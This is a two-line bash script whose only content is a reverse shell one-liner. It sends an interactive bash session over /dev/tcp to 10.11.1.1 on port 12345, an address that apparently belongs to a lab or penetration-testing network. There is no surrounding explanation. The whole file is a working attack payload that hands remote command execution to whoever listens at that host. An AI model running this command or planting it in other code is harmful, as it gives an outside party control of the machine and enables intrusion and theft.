#!/bin/bash
bash -i >& /dev/tcp/10.11.1.1/12345 0>&1
